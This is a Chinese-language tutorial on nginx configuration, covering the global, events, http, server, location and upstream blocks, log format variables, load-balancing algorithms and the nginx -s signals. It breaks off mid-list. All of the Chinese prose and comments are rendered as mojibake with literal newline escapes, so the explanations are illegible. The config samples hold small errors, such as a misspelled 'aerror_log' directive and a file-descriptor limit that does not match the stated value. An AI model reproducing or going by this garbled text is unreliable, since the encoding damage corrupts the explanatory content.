server(ä¸»æœºè®¾ç½®)[httpé‡Œå¤šä¸ª]\n    + location(URLåŒ¹é…)[serveré‡Œå¤šä¸ª]\n  + upstream(è´Ÿè½½å‡è¡¡æœåŠ¡å™¨è®¾ç½®)[httpé‡Œä¸€ä¸ª]\n\n\n\n1ã€å…¨å±€å—ï¼šé…ç½®å½±å“nginxå…¨å±€çš„æŒ‡ä»¤ã€‚ä¸€èˆ¬æœ‰è¿è¡ŒnginxæœåŠ¡å™¨çš„ç”¨æˆ·ç»„ï¼Œnginxè¿›ç¨‹pidå­˜æ”¾è·¯å¾„ï¼Œæ—¥å¿—å­˜æ”¾è·¯å¾„ï¼Œé…ç½®æ–‡ä»¶å¼•å…¥ï¼Œå…è®¸ç”Ÿæˆworker processæ•°ç­‰ã€‚\n\n2ã€eventså—ï¼šé…ç½®å½±å“nginxæœåŠ¡å™¨æˆ–ä¸ç”¨æˆ·çš„ç½‘ç»œè¿æ¥ã€‚æœ‰æ¯ä¸ªè¿›ç¨‹çš„æœ€å¤§è¿æ¥æ•°ï¼Œé€‰å–å“ªç§äº‹ä»¶é©±åŠ¨æ¨¡å‹å¤„ç†è¿æ¥è¯·æ±‚ï¼Œæ˜¯å¦å…è®¸åŒæ—¶æ¥å—å¤šä¸ªç½‘è·¯è¿æ¥ï¼Œå¼€å¯å¤šä¸ªç½‘ç»œè¿æ¥åºåˆ—åŒ–ç­‰ã€‚\n\n3ã€httpå—ï¼šå¯ä»¥åµŒå¥—å¤šä¸ªserverï¼Œé…ç½®ä»£ç†ï¼Œç¼“å­˜ï¼Œæ—¥å¿—å®šä¹‰ç­‰ç»å¤§å¤šæ•°åŠŸèƒ½å’Œç¬¬ä¸‰æ–¹æ¨¡å—çš„é…ç½®ã€‚å¦‚æ–‡ä»¶å¼•å…¥ï¼Œmime-typeå®šä¹‰ï¼Œæ—¥å¿—è‡ªå®šä¹‰ï¼Œæ˜¯å¦ä½¿ç”¨sendfileä¼ è¾“æ–‡ä»¶ï¼Œè¿æ¥è¶…æ—¶æ—¶é—´ï¼Œå•è¿æ¥è¯·æ±‚æ•°ç­‰ã€‚\n\n4ã€serverå—ï¼šé…ç½®è™šæ‹Ÿä¸»æœºçš„ç›¸å…³å‚æ•°ï¼Œä¸€ä¸ªhttpä¸­å¯ä»¥æœ‰å¤šä¸ªserverã€‚\n\n5ã€locationå—ï¼šé…ç½®è¯·æ±‚çš„è·¯ç”±ï¼Œä»¥åŠå„ç§é¡µé¢çš„å¤„ç†æƒ…å†µã€‚\n\n6ã€upstreamå—ï¼šè´Ÿè´£è´Ÿè½½å‡è¡¡\n\n\n\n```nginx\n########### æ¯ä¸ªæŒ‡ä»¤å¿…é¡»æœ‰åˆ†å·ç»“æŸã€‚#################\n\n#user administrator administrators;  #é…ç½®ç”¨æˆ·æˆ–è€…ç»„ï¼Œé»˜è®¤ä¸ºnobody nobodyã€‚\n#worker_processes 2;  #å…è®¸ç”Ÿæˆçš„è¿›ç¨‹æ•°ï¼Œé»˜è®¤ä¸º1\n#pid /nginx/pid/nginx.pid;   #æŒ‡å®šnginxè¿›ç¨‹è¿è¡Œæ–‡ä»¶å­˜æ”¾åœ°å€\n\nerror_log log/error.log debug;  #åˆ¶å®šæ—¥å¿—è·¯å¾„ï¼Œçº§åˆ«ã€‚è¿™ä¸ªè®¾ç½®å¯ä»¥æ”¾å…¥å…¨å±€å—ï¼Œhttpå—ï¼Œserverå—ï¼Œçº§åˆ«åˆ†åˆ«ä¸ºï¼šdebug|info|notice|warn|error|crit|alert|emerg\n\n\nevents {\n    accept_mutex on;   #è®¾ç½®ç½‘è·¯è¿æ¥åºåˆ—åŒ–ï¼Œé˜²æ­¢æƒŠç¾¤ç°è±¡å‘ç”Ÿï¼Œé»˜è®¤ä¸ºon\n    multi_accept on;  #è®¾ç½®ä¸€ä¸ªè¿›ç¨‹æ˜¯å¦åŒæ—¶æ¥å—å¤šä¸ªç½‘ç»œè¿æ¥ï¼Œé»˜è®¤ä¸ºoff\n    #use epoll;      #äº‹ä»¶é©±åŠ¨æ¨¡å‹ï¼Œselect|poll|kqueue|epoll|resig|/dev/poll|eventport\n    worker_connections  1024;    #æœ€å¤§è¿æ¥æ•°ï¼Œé»˜è®¤ä¸º512\n}\n\n\nhttp {\n    include       mime.types;   #æ–‡ä»¶æ‰©å±•åä¸æ–‡ä»¶ç±»å‹æ˜ å°„è¡¨\n    default_type  application/octet-stream; #é»˜è®¤æ–‡ä»¶ç±»å‹ï¼Œé»˜è®¤ä¸ºtext/plain\n    #access_log off; #å–æ¶ˆæœåŠ¡æ—¥å¿—    \n    log_format myFormat '$remote_addrâ€“$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for'; #è‡ªå®šä¹‰æ ¼å¼\n    access_log log/access.log myFormat;  #combinedä¸ºæ—¥å¿—æ ¼å¼çš„é»˜è®¤å€¼\n  \n \n    sendfile on;   #å…è®¸sendfileæ–¹å¼ä¼ è¾“æ–‡ä»¶ï¼Œé»˜è®¤ä¸ºoffï¼Œå¯ä»¥åœ¨httpå—ï¼Œserverå—ï¼Œlocationå—ã€‚\n    sendfile_max_chunk 100k;  #æ¯ä¸ªè¿›ç¨‹æ¯æ¬¡è°ƒç”¨ä¼ è¾“æ•°é‡ä¸èƒ½å¤§äºè®¾å®šçš„å€¼ï¼Œé»˜è®¤ä¸º0ï¼Œå³ä¸è®¾ä¸Šé™ã€‚\n    keepalive_timeout 65;  #è¿æ¥è¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤ä¸º75sï¼Œå¯ä»¥åœ¨httpï¼Œserverï¼Œlocationå—ã€‚\n\n    upstream mysvr {   \n      server 127.0.0.1:7878;\n      server 192.168.10.121:3333 backup;  #çƒ­å¤‡\n    }\n  \n    error_page 404 https://www.baidu.com; #é”™è¯¯é¡µ\n    \n  \tserver {\n        keepalive_requests 120; #å•è¿æ¥è¯·æ±‚ä¸Šé™æ¬¡æ•°ã€‚\n        listen       4545;   #ç›‘å¬ç«¯å£\n        server_name  127.0.0.1;   #ç›‘å¬åœ°å€       \n        \n    \t\tlocation  ~*^.+$ {       #è¯·æ±‚çš„urlè¿‡æ»¤ï¼Œæ­£åˆ™åŒ¹é…ï¼Œ~ä¸ºåŒºåˆ†å¤§å°å†™ï¼Œ~*ä¸ºä¸åŒºåˆ†å¤§å°å†™ã€‚\n           #root path;  #æ ¹ç›®å½•\n           #index vv.txt;  #è®¾ç½®é»˜è®¤é¡µ\n           proxy_pass  http://mysvr;  #è¯·æ±‚è½¬å‘mysvr å®šä¹‰çš„æœåŠ¡å™¨åˆ—è¡¨\n           deny 127.0.0.1;  #æ‹’ç»çš„ip\n           allow 172.18.5.54; #å…è®¸çš„ip           \n        }\n    }\n}\n```\n\n\n\n+ `$remote_addr` ä¸`$http_x_forwarded_for` ç”¨ä»¥è®°å½•å®¢æˆ·ç«¯çš„ipåœ°å€ï¼› \n+ `$remote_user` ç”¨æ¥è®°å½•å®¢æˆ·ç«¯ç”¨æˆ·åç§°ï¼› \n+ `$time_local` ç”¨æ¥è®°å½•è®¿é—®æ—¶é—´ä¸æ—¶åŒºï¼›\n+ `$request` ç”¨æ¥è®°å½•è¯·æ±‚çš„urlä¸httpåè®®ï¼›\n+ `$status` ç”¨æ¥è®°å½•è¯·æ±‚çŠ¶æ€ï¼›æˆåŠŸæ˜¯200ï¼Œ \n+ `body_bytes_sent` è®°å½•å‘é€ç»™å®¢æˆ·ç«¯æ–‡ä»¶ä¸»ä½“å†…å®¹å¤§å°ï¼›\n+ `$http_referer` ç”¨æ¥è®°å½•ä»é‚£ä¸ªé¡µé¢é“¾æ¥è®¿é—®è¿‡æ¥çš„ï¼› 8.$http_user_agent ï¼šè®°å½•å®¢æˆ·ç«¯æµè§ˆå™¨çš„ç›¸å…³ä¿¡æ¯ï¼›\n\n+ æƒŠç¾¤ç°è±¡ï¼šä¸€ä¸ªç½‘è·¯è¿æ¥åˆ°æ¥ï¼Œå¤šä¸ªç¡çœ çš„è¿›ç¨‹è¢«åŒæ—¶å«é†’ï¼Œä½†åªæœ‰ä¸€ä¸ªè¿›ç¨‹èƒ½è·å¾—é“¾æ¥ï¼Œè¿™æ ·ä¼šå½±å“ç³»ç»Ÿæ€§èƒ½ã€‚\n\n+ æ¯ä¸ªæŒ‡ä»¤å¿…é¡»æœ‰åˆ†å·ç»“æŸã€‚\n\n\n\n# ä¸‰. æ¨¡å—é…ç½®è¯´æ˜\n\n### 3.1 mainæ¨¡å—\n\n```nginx\nuser nobody nobody;\nworker_processes 2;\nerror_log  /usr/local/var/log/nginx/error.log  notice;\npid        /usr/local/var/run/nginx/nginx.pid;\nworker_rlimit_nofile 1024;\n```\n\n\n\n+ user æ¥æŒ‡å®šNginx Workerè¿›ç¨‹è¿è¡Œç”¨æˆ·ä»¥åŠç”¨æˆ·ç»„ï¼Œé»˜è®¤ç”±nobodyè´¦å·è¿è¡Œã€‚\n\n+ worker_processesæ¥æŒ‡å®šäº†Nginxè¦å¼€å¯çš„å­è¿›ç¨‹æ•°ã€‚æ¯ä¸ªNginxè¿›ç¨‹å¹³å‡è€—è´¹10M~12Må†…å­˜ã€‚æ ¹æ®ç»éªŒï¼Œä¸€èˆ¬æŒ‡å®š1ä¸ªè¿›ç¨‹å°±è¶³å¤Ÿäº†ï¼Œå¦‚æœæ˜¯å¤šæ ¸CPUï¼Œå»ºè®®æŒ‡å®šå’ŒCPUçš„æ•°é‡ä¸€æ ·çš„è¿›ç¨‹æ•°å³å¯ã€‚æˆ‘è¿™é‡Œå†™2ï¼Œé‚£ä¹ˆå°±ä¼šå¼€å¯2ä¸ªå­è¿›ç¨‹ï¼Œæ€»å…±3ä¸ªè¿›ç¨‹ã€‚å¯ä»¥å†™ auto.\n\n+ error_logç”¨æ¥å®šä¹‰å…¨å±€é”™è¯¯æ—¥å¿—æ–‡ä»¶ã€‚æ—¥å¿—è¾“å‡ºçº§åˆ«æœ‰debugã€infoã€noticeã€warnã€errorã€critå¯ä¾›é€‰æ‹©ï¼Œå…¶ä¸­ï¼Œdebugè¾“å‡ºæ—¥å¿—æœ€ä¸ºæœ€è¯¦ç»†ï¼Œè€Œcritè¾“å‡ºæ—¥å¿—æœ€å°‘ã€‚\n\n+ pidç”¨æ¥æŒ‡å®šè¿›ç¨‹idçš„å­˜å‚¨æ–‡ä»¶ä½ç½®ã€‚\n\n+ worker_rlimit_nofileç”¨äºæŒ‡å®šä¸€ä¸ªnginxè¿›ç¨‹å¯ä»¥æ‰“å¼€çš„æœ€å¤šæ–‡ä»¶æè¿°ç¬¦æ•°ç›®ï¼Œè¿™é‡Œæ˜¯65535ï¼Œéœ€è¦ä½¿ç”¨å‘½ä»¤â€œulimit -n 65535â€æ¥è®¾ç½®ã€‚\n\n  \n\n### 3.2 events æ¨¡å—\n\neventsæ¨¡å—æ¥ç”¨æŒ‡å®šnginxçš„å·¥ä½œæ¨¡å¼å’Œå·¥ä½œæ¨¡å¼åŠè¿æ¥æ•°ä¸Šé™\n\n```nginx\nevents {\n     use kqueue; #macå¹³å°\n     worker_connections  1024;\n}\n```\n\n\n\n+ useç”¨æ¥æŒ‡å®šNginxçš„å·¥ä½œæ¨¡å¼ã€‚Nginxæ”¯æŒçš„å·¥ä½œæ¨¡å¼æœ‰selectã€pollã€kqueueã€epollã€rtsigå’Œ/dev/pollã€‚å…¶ä¸­selectå’Œpolléƒ½æ˜¯æ ‡å‡†çš„å·¥ä½œæ¨¡å¼ï¼Œkqueueå’Œepollæ˜¯é«˜æ•ˆçš„å·¥ä½œæ¨¡å¼ï¼Œä¸åŒçš„æ˜¯epollç”¨åœ¨Linuxå¹³å°ä¸Šï¼Œè€Œkqueueç”¨åœ¨BSDç³»ç»Ÿä¸­ï¼Œå› ä¸ºMacåŸºäºBSD,æ‰€ä»¥Macä¹Ÿå¾—ç”¨è¿™ä¸ªæ¨¡å¼ï¼Œå¯¹äºLinuxç³»ç»Ÿï¼Œepollå·¥ä½œæ¨¡å¼æ˜¯é¦–é€‰ã€‚\n\n+ worker_connectionsç”¨äºå®šä¹‰Nginxæ¯ä¸ªè¿›ç¨‹çš„æœ€å¤§è¿æ¥æ•°ï¼Œå³æ¥æ”¶å‰ç«¯çš„æœ€å¤§è¯·æ±‚æ•°ï¼Œé»˜è®¤æ˜¯1024ã€‚æœ€å¤§å®¢æˆ·ç«¯è¿æ¥æ•°ç”±worker_processeså’Œworker_connectionså†³å®š\n+ å³Max_clients=worker_processes*worker_connectionsï¼Œåœ¨ä½œä¸ºåå‘ä»£ç†æ—¶ï¼ŒMax_clientså˜ä¸ºï¼šMax_clients = worker_processes * worker_connections/4ã€‚ \n\n+ è¿›ç¨‹çš„æœ€å¤§è¿æ¥æ•°å—Linuxç³»ç»Ÿè¿›ç¨‹çš„æœ€å¤§æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶ï¼Œåœ¨æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤â€œulimit -n 65536â€åworker_connectionsçš„è®¾ç½®æ‰èƒ½ç”Ÿæ•ˆã€‚\n\n\n\n### 3.3 http æ¨¡å—\n\nhttpæ¨¡å—å¯ä»¥è¯´æ˜¯æœ€æ ¸å¿ƒçš„æ¨¡å—äº†ï¼Œå®ƒè´Ÿè´£HTTPæœåŠ¡å™¨ç›¸å…³å±æ€§çš„é…ç½®ï¼Œå®ƒé‡Œé¢çš„serverå’Œupstreamå­æ¨¡å—ï¼Œè‡³å…³é‡è¦ã€‚\n\n```nginx\nhttp {\n     include       mime.types;\n     default_type  application/octet-stream;\n     log_format  main  'remote_addr - remote_user [time_local] \"request\" '\n                       'status body_bytes_sent \"$http_referer\" '\n                       '\"http_user_agent\" \"http_x_forwarded_for\"';\n     access_log  /usr/local/var/log/nginx/access.log  main;\n     sendfile        on;\n     tcp_nopush      on;\n     tcp_nodelay     on;\n     keepalive_timeout  10;\n     #gzip  on;\n     \n     upstream myproject {\n         .....\n     }\n     \n  \t server {\n         ....\n     }\n}\n```\n\n\n\n+ include ç”¨æ¥è®¾å®šæ–‡ä»¶çš„mimeç±»å‹,ç±»å‹åœ¨é…ç½®æ–‡ä»¶ç›®å½•ä¸‹çš„mime.typeæ–‡ä»¶å®šä¹‰ï¼Œæ¥å‘Šè¯‰nginxæ¥è¯†åˆ«æ–‡ä»¶ç±»å‹ã€‚\n\n+ default_typeè®¾å®šäº†é»˜è®¤çš„ç±»å‹ä¸ºäºŒè¿›åˆ¶æµï¼Œä¹Ÿå°±æ˜¯å½“æ–‡ä»¶ç±»å‹æœªå®šä¹‰æ—¶ä½¿ç”¨è¿™ç§æ–¹å¼ã€‚\n\n+ log_formatç”¨äºè®¾ç½®æ—¥å¿—çš„æ ¼å¼ï¼Œå’Œè®°å½•å“ªäº›å‚æ•°ï¼Œè¿™é‡Œè®¾ç½®ä¸ºmainï¼Œåˆšå¥½ç”¨äºaccess_logæ¥è®°å½•è¿™ç§ç±»å‹ã€‚\n\n  mainçš„ç±»å‹æ—¥å¿—å¦‚ä¸‹ï¼šä¹Ÿå¯ä»¥å¢åˆ éƒ¨åˆ†å‚æ•°ã€‚\n\n  127.0.0.1 - - [21/Apr/2015:18:09:54 +0800] \"GET /index.php HTTP/1.1\" 200 87151 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36\" \n\n+ access_log ç”¨æ¥çºªå½•æ¯æ¬¡çš„è®¿é—®æ—¥å¿—çš„æ–‡ä»¶åœ°å€ï¼Œåé¢çš„mainæ˜¯æ—¥å¿—çš„æ ¼å¼æ ·å¼ï¼Œå¯¹åº”äºlog_formatçš„mainã€‚\n\n+ sendfileå‚æ•°ç”¨äºå¼€å¯é«˜æ•ˆæ–‡ä»¶ä¼ è¾“æ¨¡å¼ã€‚\n+ å°†tcp_nopushå’Œtcp_nodelayä¸¤ä¸ªæŒ‡ä»¤è®¾ç½®ä¸ºonç”¨äºé˜²æ­¢ç½‘ç»œé˜»å¡ã€‚\n\n+ keepalive_timeoutè®¾ç½®å®¢æˆ·ç«¯è¿æ¥ä¿æŒæ´»åŠ¨çš„è¶…æ—¶æ—¶é—´ã€‚åœ¨è¶…è¿‡è¿™ä¸ªæ—¶é—´ä¹‹åï¼ŒæœåŠ¡å™¨ä¼šå…³é—­è¯¥è¿æ¥ã€‚\n\n\n\n### 3.4 server æ¨¡å— (httpçš„å­æ¨¡å—, è™šæ‹Ÿä¸»æœº)\n\nsever æ¨¡å—æ˜¯httpçš„å­æ¨¡å—ï¼Œå®ƒç”¨æ¥å®šä¸€ä¸ªè™šæ‹Ÿä¸»æœºã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸€ä¸ªç®€å•çš„server æ˜¯å¦‚ä½•åšçš„ï¼Ÿ\n\n```nginx\nserver {\n         listen       8080;\n         server_name  test.liuvv.com;\n         root   /home/levonfly/www;         # å…¨å±€å®šä¹‰ï¼Œå¦‚æœéƒ½æ˜¯è¿™ä¸€ä¸ªç›®å½•ï¼Œè¿™æ ·å®šä¹‰æœ€ç®€å•ã€‚\n         index  index.php index.html index.htm; \n         charset utf-8;\n         access_log  usr/local/var/log/host.access.log  main;\n         aerror_log  usr/local/var/log/host.error.log  error;\n         ....\n}\n```\n\n+ serveræ ‡å¿—å®šä¹‰è™šæ‹Ÿä¸»æœºå¼€å§‹ã€‚ \n\n+ listenç”¨äºæŒ‡å®šè™šæ‹Ÿä¸»æœºçš„æœåŠ¡ç«¯å£ã€‚ \n\n+ server_nameç”¨æ¥æŒ‡å®šIPåœ°å€æˆ–è€…åŸŸåï¼Œå¤šä¸ªåŸŸåä¹‹é—´ç”¨ç©ºæ ¼åˆ†å¼€ã€‚ \n\n+ root è¡¨ç¤ºåœ¨è¿™æ•´ä¸ªserverè™šæ‹Ÿä¸»æœºå†…ï¼Œå…¨éƒ¨çš„root webæ ¹ç›®å½•ã€‚æ³¨æ„è¦å’Œlocate {}ä¸‹é¢å®šä¹‰çš„åŒºåˆ†å¼€æ¥ã€‚ \n\n+ index å…¨å±€å®šä¹‰è®¿é—®çš„é»˜è®¤é¦–é¡µåœ°å€ã€‚æ³¨æ„è¦å’Œlocate {}ä¸‹é¢å®šä¹‰çš„åŒºåˆ†å¼€æ¥ã€‚ \n\n+ charsetç”¨äºè®¾ç½®ç½‘é¡µçš„é»˜è®¤ç¼–ç æ ¼å¼ã€‚ \n\n+ access_logç”¨æ¥æŒ‡å®šæ­¤è™šæ‹Ÿä¸»æœºçš„è®¿é—®æ—¥å¿—å­˜æ”¾è·¯å¾„ï¼Œæœ€åçš„mainç”¨äºæŒ‡å®šè®¿é—®æ—¥å¿—çš„è¾“å‡ºæ ¼å¼ã€‚\n\n\n\n### 3.5 location æ¨¡å—(serverçš„å­æ¨¡å—, é‡è¦)\n\nlocationæ¨¡å—æ˜¯nginxä¸­ç”¨çš„æœ€å¤šçš„ï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„æ¨¡å—äº†ï¼Œä»€ä¹ˆè´Ÿè½½å‡è¡¡å•Šã€åå‘ä»£ç†å•Šã€è™šæ‹ŸåŸŸåå•Šéƒ½ä¸å®ƒç›¸å…³ã€‚\n\nlocation æ ¹æ®å®ƒå­—é¢æ„æ€å°±çŸ¥é“æ˜¯æ¥å®šä½çš„ï¼Œå®šä½URLï¼Œè§£æURLï¼Œæ‰€ä»¥ï¼Œå®ƒä¹Ÿæä¾›äº†å¼ºå¤§çš„æ­£åˆ™åŒ¹é…åŠŸèƒ½ï¼Œä¹Ÿæ”¯æŒæ¡ä»¶åˆ¤æ–­åŒ¹é…ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡locationæŒ‡ä»¤å®ç°Nginxå¯¹åŠ¨ã€é™æ€ç½‘é¡µè¿›è¡Œè¿‡æ»¤å¤„ç†ã€‚\n\n\n\næˆ‘ä»¬å…ˆæ¥çœ‹è¿™ä¸ªï¼Œè®¾å®šé»˜è®¤é¦–é¡µå’Œè™šæ‹Ÿæœºç›®å½•ã€‚\n\n```nginx\nlocation / {\n\troot   /home/levonfly/www;\n\tindex  index.php index.html index.htm;\n}\n```\n\n+ location /è¡¨ç¤ºåŒ¹é…è®¿é—®æ ¹ç›®å½•ã€‚\n\n+ rootæŒ‡ä»¤ç”¨äºæŒ‡å®šè®¿é—®æ ¹ç›®å½•æ—¶ï¼Œè™šæ‹Ÿä¸»æœºçš„webç›®å½•ï¼Œè¿™ä¸ªç›®å½•å¯ä»¥æ˜¯ç›¸å¯¹è·¯å¾„ï¼ˆç›¸å¯¹è·¯å¾„æ˜¯ç›¸å¯¹äºnginxçš„å®‰è£…ç›®å½•ï¼‰ã€‚ä¹Ÿå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ã€‚\n\n+ indexç”¨äºè®¾å®šæˆ‘ä»¬åªè¾“å…¥åŸŸååè®¿é—®çš„é»˜è®¤é¦–é¡µåœ°å€ï¼Œæœ‰ä¸ªå…ˆåé¡ºåºï¼šindex.php index.html index.htmï¼Œå¦‚æœæ²¡æœ‰å¼€å¯ç›®å½•æµè§ˆæƒé™ï¼Œåˆæ‰¾ä¸åˆ°è¿™äº›é»˜è®¤é¦–é¡µï¼Œå°±ä¼šæŠ¥403é”™è¯¯ã€‚\n\n  \n\nlocation è¿˜æœ‰ä¸€ç§æ–¹å¼å°±æ˜¯æ­£åˆ™åŒ¹é…ï¼Œå¼€å¯æ­£åˆ™åŒ¹é…è¿™æ ·ï¼š`location ~`ã€‚åé¢åŠ ä¸ª`~`ã€‚ä¸‹é¢è¿™ä¸ªä¾‹å­æ˜¯è¿ç”¨`æ­£åˆ™åŒ¹é…`æ¥é“¾æ¥phpã€‚\n\n```nginx\nlocation ~ \\.php$ {\n            root           /home/levonfly/www;\n            fastcgi_pass   127.0.0.1:9000;\n            fastcgi_index  index.php;\n            include        fastcgi.conf;\n        }\n```\n\n`\\.php$` ç†Ÿæ‚‰æ­£åˆ™çš„æˆ‘ä»¬ç›´åˆ°ï¼Œè¿™æ˜¯åŒ¹é…`.php`ç»“å°¾çš„URLï¼Œç”¨æ¥è§£æphpæ–‡ä»¶ã€‚é‡Œé¢çš„`root`ä¹Ÿæ˜¯ä¸€æ ·ï¼Œç”¨æ¥è¡¨ç¤ºè™šæ‹Ÿä¸»æœºçš„æ ¹ç›®å½•ã€‚ \n`fast_pass`é“¾æ¥çš„æ˜¯`php-fpm` çš„åœ°å€ï¼Œä¹‹å‰æˆ‘ä»¬ä¹Ÿæ­å»ºè¿‡ã€‚å…¶ä»–å‡ ä¸ªå‚æ•°æˆ‘ä»¬ä»¥åå†è¯´ã€‚\n\n\n\n### 3.6 upstream æ¨¡å—(httpå­æ¨¡å—)\n\nupstream æ¨¡å—è´Ÿå€ºè´Ÿè½½å‡è¡¡æ¨¡å—ï¼Œé€šè¿‡ä¸€ä¸ªç®€å•çš„è°ƒåº¦ç®—æ³•æ¥å®ç°å®¢æˆ·ç«¯IPåˆ°åç«¯æœåŠ¡å™¨çš„è´Ÿè½½å‡è¡¡ã€‚æˆ‘å…ˆå­¦ä¹ æ€ä¹ˆç”¨ï¼Œå…·ä½“çš„ä½¿ç”¨å®ä¾‹ä»¥åå†è¯´ã€‚\n\n```nginx\nupstream liuvv.com{\n     ip_hash;\n     server 192.168.12.1:80;\n     server 192.168.12.2:80 down;\n     server 192.168.12.3:8080  max_fails=3  fail_timeout=20s;\n     server 192.168.12.4:8080;\n}\n```\n\nåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œé€šè¿‡upstreamæŒ‡ä»¤æŒ‡å®šäº†ä¸€ä¸ªè´Ÿè½½å‡è¡¡å™¨çš„åç§°liuvv.comã€‚è¿™ä¸ªåç§°å¯ä»¥ä»»æ„æŒ‡å®šï¼Œåœ¨åé¢éœ€è¦çš„åœ°æ–¹ç›´æ¥è°ƒç”¨å³å¯ã€‚\n\n\n\né‡Œé¢æ˜¯ip_hashè¿™æ˜¯å…¶ä¸­çš„ä¸€ç§è´Ÿè½½å‡è¡¡è°ƒåº¦ç®—æ³•ï¼Œä¸‹é¢ä¼šç€é‡ä»‹ç»ã€‚ç´§æ¥ç€å°±æ˜¯å„ç§æœåŠ¡å™¨äº†ã€‚ç”¨serverå…³é”®å­—è¡¨è¯†ï¼Œåé¢æ¥ipã€‚\n\nNginxçš„è´Ÿè½½å‡è¡¡æ¨¡å—ç›®å‰æ”¯æŒ4ç§è°ƒåº¦ç®—æ³•:\n\n1. weight è½®è¯¢ï¼ˆé»˜è®¤ï¼‰ã€‚æ¯ä¸ªè¯·æ±‚æŒ‰æ—¶é—´é¡ºåºé€ä¸€åˆ†é…åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ï¼Œå¦‚æœåç«¯æŸå°æœåŠ¡å™¨å®•æœºï¼Œæ•…éšœç³»ç»Ÿè¢«è‡ªåŠ¨å‰”é™¤ï¼Œä½¿ç”¨æˆ·è®¿é—®ä¸å—å½±å“ã€‚weightã€‚æŒ‡å®šè½®è¯¢æƒå€¼ï¼Œweightå€¼è¶Šå¤§ï¼Œåˆ†é…åˆ°çš„è®¿é—®æœºç‡è¶Šé«˜ï¼Œä¸»è¦ç”¨äºåç«¯æ¯ä¸ªæœåŠ¡å™¨æ€§èƒ½ä¸å‡çš„æƒ…å†µä¸‹ã€‚\n2. ip_hashã€‚æ¯ä¸ªè¯·æ±‚æŒ‰è®¿é—®IPçš„hashç»“æœåˆ†é…ï¼Œè¿™æ ·æ¥è‡ªåŒä¸€ä¸ªIPçš„è®¿å®¢å›ºå®šè®¿é—®ä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œæœ‰æ•ˆè§£å†³äº†åŠ¨æ€ç½‘é¡µå­˜åœ¨çš„sessionå…±äº«é—®é¢˜ã€‚\n3. fairã€‚æ¯”ä¸Šé¢ä¸¤ä¸ªæ›´åŠ æ™ºèƒ½çš„è´Ÿè½½å‡è¡¡ç®—æ³•ã€‚æ­¤ç§ç®—æ³•å¯ä»¥ä¾æ®é¡µé¢å¤§å°å’ŒåŠ è½½æ—¶é—´é•¿çŸ­æ™ºèƒ½åœ°è¿›è¡Œè´Ÿè½½å‡è¡¡ï¼Œä¹Ÿå°±æ˜¯æ ¹æ®åç«¯æœåŠ¡å™¨çš„å“åº”æ—¶é—´æ¥åˆ†é…è¯·æ±‚ï¼Œå“åº”æ—¶é—´çŸ­çš„ä¼˜å…ˆåˆ†é…ã€‚Nginxæœ¬èº«æ˜¯ä¸æ”¯æŒfairçš„ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨è¿™ç§è°ƒåº¦ç®—æ³•ï¼Œå¿…é¡»ä¸‹è½½Nginxçš„upstream_fairæ¨¡å—ã€‚\n4. url_hashã€‚æŒ‰è®¿é—®urlçš„hashç»“æœæ¥åˆ†é…è¯·æ±‚ï¼Œä½¿æ¯ä¸ªurlå®šå‘åˆ°åŒä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œå¯ä»¥è¿›ä¸€æ­¥æé«˜åç«¯ç¼“å­˜æœåŠ¡å™¨çš„æ•ˆç‡ã€‚Nginxæœ¬èº«æ˜¯ä¸æ”¯æŒurl_hashçš„ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨è¿™ç§è°ƒåº¦ç®—æ³•ï¼Œå¿…é¡»å®‰è£…Nginx çš„hashè½¯ä»¶åŒ…ã€‚\n\n\n\nåœ¨HTTP Upstreamæ¨¡å—ä¸­ï¼Œå¯ä»¥é€šè¿‡serveræŒ‡ä»¤æŒ‡å®šåç«¯æœåŠ¡å™¨çš„IPåœ°å€å’Œç«¯å£ï¼ŒåŒæ—¶è¿˜å¯ä»¥è®¾å®šæ¯ä¸ªåç«¯æœåŠ¡å™¨åœ¨è´Ÿè½½å‡è¡¡è°ƒåº¦ä¸­çš„çŠ¶æ€ã€‚å¸¸ç”¨çš„çŠ¶æ€æœ‰ï¼š\n\n- downï¼Œè¡¨ç¤ºå½“å‰çš„serveræš‚æ—¶ä¸å‚ä¸è´Ÿè½½å‡è¡¡ã€‚\n- backupï¼Œé¢„ç•™çš„å¤‡ä»½æœºå™¨ã€‚å½“å…¶ä»–æ‰€æœ‰çš„ébackupæœºå™¨å‡ºç°æ•…éšœæˆ–è€…å¿™çš„æ—¶å€™ï¼Œæ‰ä¼šè¯·æ±‚backupæœºå™¨ï¼Œå› æ­¤è¿™å°æœºå™¨çš„å‹åŠ›æœ€è½»ã€‚\n- max_failsï¼Œå…è®¸è¯·æ±‚å¤±è´¥çš„æ¬¡æ•°ï¼Œé»˜è®¤ä¸º1ã€‚å½“è¶…è¿‡æœ€å¤§æ¬¡æ•°æ—¶ï¼Œè¿”å›proxy_next_upstream æ¨¡å—å®šä¹‰çš„é”™è¯¯ã€‚\n- fail_timeoutï¼Œåœ¨ç»å†äº†max_failsæ¬¡å¤±è´¥åï¼Œæš‚åœæœåŠ¡çš„æ—¶é—´ã€‚max_failså¯ä»¥å’Œfail_timeoutä¸€èµ·ä½¿ç”¨ã€‚\n\n**æ³¨æ„** å½“è´Ÿè½½è°ƒåº¦ç®—æ³•ä¸ºip_hashæ—¶ï¼Œåç«¯æœåŠ¡å™¨åœ¨è´Ÿè½½å‡è¡¡è°ƒåº¦ä¸­çš„çŠ¶æ€ä¸èƒ½æ˜¯weightå’Œbackupã€‚\n\n\n\n# å››. nginx é…ç½®å®æˆ˜\n\n### 4.1 nginxæŒ‡ä»¤\n\n```\nnginx -s signal\n```\n\nWhere *signal* may be one of the following:\n\n- stop â€” fast shutdown\n- quit â€” graceful shutdown\n- reload â€” reloading the configuration file\n- reopen â€” reopening the log 